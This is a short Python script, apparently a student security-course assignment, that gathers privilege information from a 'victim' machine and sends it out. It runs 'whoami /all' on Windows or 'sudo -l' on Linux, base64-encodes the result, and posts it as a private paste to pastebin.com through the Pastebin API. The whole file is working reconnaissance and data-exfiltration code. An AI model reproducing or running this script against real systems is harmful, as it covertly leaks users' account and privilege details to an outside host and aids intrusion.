#  Felicia Angelina - 2301892793
import platform
import base64
import requests
import sys
from subprocess import PIPE, Popen

api_key = "put pastebin api key here"

def pastebin():
    message = f"Victim OS Agent: {platform.platform()}\n"

    # check what os is running on system
    if platform.system() == "Windows":
        # if windows check user, group, and privileges information using whoami
        check = Popen("whoami /all", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        result, error = check.communicate()
    elif platform.system() == "Linux":
        # if linux check user, group, and privileges information using sudo
        check = Popen("sudo -l", stdin=PIPE, stdout=PIPE, stderr=PIPE, shell=True)
        result, error = check.communicate()

    # if the result is an empty bytes it means there is an error
    if result == b"":
        message += f"Error: {error.decode()}"
    else:
        message += f"Result: {result.decode()}"

    # encode the message to base64
    enc_result = base64.b64encode(message.encode('utf-8'))

    # parameter for creating a new paste
    pastebin_data = {
        'api_dev_key': api_key,
        'api_option': 'paste',
        'api_paste_name': 'GSLC-Pastebin',
        'api_paste_code': enc_result,
        'api_paste_private': 1
    }

    # try sending api request using pastebin api data
    try:
        send = requests.post("https://pastebin.com/api/api_post.php", data = pastebin_data)
        print(f"Status code: {send.status_code}")
        print(f"Pastebin Link : {send.text}")
    except Exception as e:
        # if it failed it will exit
        sys.exit()

if __name__ == "__main__":
    pastebin()